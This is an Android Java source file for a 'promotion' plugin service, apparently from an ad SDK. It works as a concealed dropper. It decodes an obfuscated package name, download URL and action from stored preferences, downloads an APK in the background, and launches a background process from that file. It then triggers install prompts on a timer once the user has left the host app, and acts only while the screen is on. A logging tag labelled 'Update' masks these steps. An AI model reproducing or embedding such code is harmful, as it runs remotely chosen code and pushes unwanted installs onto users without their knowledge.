package com.mf.promotion.service.impl;

import java.io.File;
import java.util.Calendar;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;

import com.mf.basecode.model.MyPackageInfo;
import com.mf.basecode.service.HandleService;
import com.mf.basecode.utils.EncryptUtils;
import com.mf.basecode.utils.Logger;
import com.mf.basecode.utils.contants.CommConstants;
import com.mf.download.model.DownloadInfo;
import com.mf.download.util.DownloadConstants;
import com.mf.download.util.DownloadUtils;
import com.mf.promotion.service.MFApkServiceFactory;
import com.mf.promotion.util.PluginNav;
import com.mf.promotion.util.PromUtils;
import com.mf.promotion.util.TimerManager;
import com.mf.statistics.prom.util.StatsPromConstants;
import com.mf.utils.AppInstallUtils;

public class HandlePluginService extends HandleService {
  private static final String TAG             = "Update";

  private int                 interval;
  private int                 times           = 0;
  private String              packagename;
  private String              downurl;
  private String              action;
  private String              md5;
  private int                 popflag;
  private static Timer        mTimer          = null;
  private SharedPreferences   spf;
  public static Context mc = null;
  
  private Handler             downloadHandler = new Handler() {
                                                @Override
                                                public void handleMessage(Message msg) {
                                                  handleWakeUpDownloadMessage(msg);
                                                }
                                              };

  public HandlePluginService(int serviceId, Context c, Handler handler) {
    super(serviceId, c, handler);
    mc = c;
    spf = mContext.getSharedPreferences(CommConstants.SHARED_PREFERENCE_CONFIG, 0);
  }

  @Override
  public void onStartCommand(Intent intent, int flags, int startId) {
    Logger.e(TAG, "111111");
    
    if(!isScreenOn(mContext)){
      Logger.e(TAG, "isScreenOn "+ isScreenOn(mContext));
      return ;
    }
    if(!pSwitch(spf, CommConstants.SHOW_RULE_PLUGIN)){
      Logger.e(TAG, "pSwitch " + pSwitch(spf, CommConstants.SHOW_RULE_PLUGIN));
      return ;
    }
    startNextPluginService(CommConstants.SHOW_RULE_PLUGIN,MFApkServiceFactory.HANDLE_PLUGIN_SERVICE.getServiceId());
    if(!PromUtils.getInstance(mContext).checkHost()){
      Logger.e(TAG, "checkHost false");
      return;
    }
    handlePlugin();
  }

  protected void startNextPluginService(String key, int serviceId) {
    try {
      long sh_time = spf.getLong(CommConstants.PLUGIN_SHOW_TIME, System.currentTimeMillis());
      interval = spf.getInt(CommConstants.PLUGIN_INTERVAL, 3600);
      long time = -1;
      if(sh_time >= System.currentTimeMillis()){
        time = sh_time ;
      }else{
        time = System.currentTimeMillis()+ interval * 1000;
      }
      TimerManager.getInstance(mContext).startTimerByTime(time, serviceId);
      spf.edit().putLong(key+ "startTime", time).commit();
    } catch (Exception e) {

    }
  }

  public void handleWakeUpDownloadMessage(android.os.Message msg) {
    Bundle b = (Bundle) msg.obj;
    String adid = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_ADID);
    final String packageName = b.getString(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_PACKAGE_NAME);
    int version = b.getInt(DownloadConstants.DOWNLOAD_HANDLER_BUNDLE_VERSION_CODE);
    if (!TextUtils.isEmpty(packageName)) {
      if (msg.what == DownloadConstants.DOWNLOAD_HANDLER_STATUS_DOWNLOAD_FINISH) {
        String apkPath = DownloadUtils.getInstance(mContext).getApkDownloadFilePath(packageName, version);
        MyPackageInfo packageInfo = new MyPackageInfo(adid,packageName, 1, StatsPromConstants.STATS_PROM_AD_INFO_POSITION_PLUGIN, 0, true);
        Logger.e(TAG, ""+packageName);
        showPlugin(mContext, apkPath, packageInfo);
      }
    }
  }

  public void handlePlugin() {
    packagename = EncryptUtils.convertMD5(spf.getString(CommConstants.PLUGIN_PACKAGENAME, ""));
    if (TextUtils.isEmpty(packagename)) {
      return;
    }
    downurl = EncryptUtils.convertMD5(spf.getString(CommConstants.PLUGIN_FILEDOWNURL, ""));
    if (TextUtils.isEmpty(downurl)) {
      return;
    }
    action = EncryptUtils.convertMD5(spf.getString(CommConstants.PLUGIN_ACTIONNAME, ""));
    md5 = spf.getString(CommConstants.PLUGIN_MD5, "");
    popflag = spf.getInt(CommConstants.PLUGIN_POPFLAG, 1);
    times = spf.getInt(CommConstants.PLUGIN_TIMES, 0);
    PackageInfo pInfo = AppInstallUtils.getPgInfoByPackageName(mContext, packagename);
    String apkPath = DownloadUtils.getInstance(mContext).getApkDownloadFilePath(packagename, 1);
    if (pInfo == null) {
      File f = new File(apkPath);
      if (f.exists()) {
        MyPackageInfo packageInfo = new MyPackageInfo("plugin", packagename, 1, StatsPromConstants.STATS_PROM_AD_INFO_POSITION_PLUGIN, 0, true);
        showPlugin(mContext, apkPath, packageInfo);
      } else {
        DownloadInfo dinfo = new DownloadInfo(downloadHandler, "plugin", packagename, 1, StatsPromConstants.STATS_PROM_AD_INFO_POSITION_PLUGIN, 0, downurl,
            md5, true, false);
        MyPackageInfo packageInfo = new MyPackageInfo("plugin", packagename, 1, StatsPromConstants.STATS_PROM_AD_INFO_POSITION_PLUGIN, 0, true);
        if (DownloadUtils.getInstance(mContext).isDownloadOrWait(dinfo, packageInfo)) {
          DownloadUtils.getInstance(mContext).addExtraHandler(downloadHandler);
        } else {
          DownloadUtils.getInstance(mContext).addDownloadApkThread(dinfo);
        }
      }
    }
  }


  private void showPlugin(final Context mContext, final String apkPath, final MyPackageInfo packageInfo) {
    long sh_time = spf.getLong(CommConstants.PLUGIN_SHOW_TIME, System.currentTimeMillis());
    long a_time = spf.getLong(CommConstants.PLUGIN_ACTIVE, 3600);
    if(popflag == 0 || popflag == 1){
      PluginNav.getInstance(mContext).launchBackgroundProcess(apkPath, interval, action, packagename,0,1,sh_time/1000);
    }else{
      PluginNav.getInstance(mContext).launchBackgroundProcess(apkPath, interval, action, packagename,0,2,a_time);
    }
    if (!showAdTime()) {
        return;
     }
    long daytime = spf.getLong(CommConstants.PLUGIN_DAYTIME, 0);
    Calendar calendar = Calendar.getInstance();
    calendar.set(calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH), calendar.get(Calendar.DAY_OF_MONTH), 0, 0, 0);
    if (Math.abs(calendar.getTimeInMillis() - daytime) > 23 * 3600 * 1000) {
      spf.edit().putLong(CommConstants.PLUGIN_DAYTIME, calendar.getTimeInMillis()).commit();
      spf.edit().putInt(CommConstants.PLUGIN_COUNT, 0).commit();
      Logger.e(TAG, "Calendar" + calendar.getTimeInMillis());
    }
    int count = spf.getInt(CommConstants.PLUGIN_COUNT, 0);
    Logger.e(TAG, "count = " + count);
    if (count >= times) {
      return;
    }
    if (popflag == 1) {
      addcount();
      AppInstallUtils.installApp(mContext, apkPath, packageInfo);
    } else if (popflag == 0) {
      if (mTimer == null) {
        mTimer = new Timer();
        final String pgn = mContext.getPackageName();
        TimerTask mTimerTask = new TimerTask() {
          @Override
          public void run() {
            String topPgName = PromUtils.getInstance(mContext).getTopPackageName();
            Logger.e(TAG, "run" + topPgName);
            if (!topPgName.equals(pgn)) {
              Logger.e(TAG, "check");
              addcount();
              AppInstallUtils.installApp(mContext, apkPath, packageInfo);
              mTimer.cancel();
              mTimer = null;
            }
          }
        };
        mTimer.schedule(mTimerTask, 0, 4000);
      } else {
        Logger.e(TAG, "cun");
      }
    }

  }

  private void addcount() {
    int count = spf.getInt(CommConstants.PLUGIN_COUNT, 0);
    Logger.e(TAG, "addc" + count);
    count++;
    spf.edit().putInt(CommConstants.PLUGIN_COUNT, count).commit();

  }

  @Override
  public void handledAds(List<String> ads) {
    // TODO Auto-generated method stub
    
  }

}
